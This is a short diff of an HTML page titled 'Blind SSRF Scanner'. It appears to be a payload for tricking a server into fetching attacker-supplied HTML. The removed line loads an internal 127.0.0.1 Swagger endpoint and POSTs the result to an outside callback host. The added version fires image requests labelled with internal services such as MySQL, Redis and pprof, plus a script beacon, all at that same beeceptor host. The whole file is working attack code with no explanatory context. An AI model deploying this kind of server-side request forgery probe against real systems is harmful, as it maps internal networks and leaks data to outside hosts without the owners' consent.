@@ -1,6 +1,18 @@
-<img src="http://127.0.0.1:8080/swagger-ui/" onload='report("Loaded ok")' onerror='report("Error occurred")'>
+<!DOCTYPE html>
+<html>
+<head><title>Blind SSRF Scanner</title></head>
+<body>
+
+<!-- Try several internal ports/endpoints simultaneously -->
+<img src="https://vodagh.free.beeceptor.com/img_80_admin" />
+<img src="https://vodagh.free.beeceptor.com/img_8080_swagger" />
+<img src="https://vodagh.free.beeceptor.com/img_3306_mysql" />
+<img src="https://vodagh.free.beeceptor.com/img_6379_redis" />
+<img src="https://vodagh.free.beeceptor.com/img_5000_debug_pprof" />
+
 <script>
-function report(msg){
-  fetch("https://vodagh.free.beeceptor.com/report",{method:"POST",body:msg})
-}
+fetch("https://vodagh.free.beeceptor.com/script_executed")
 </script>
+
+</body>
+</html>
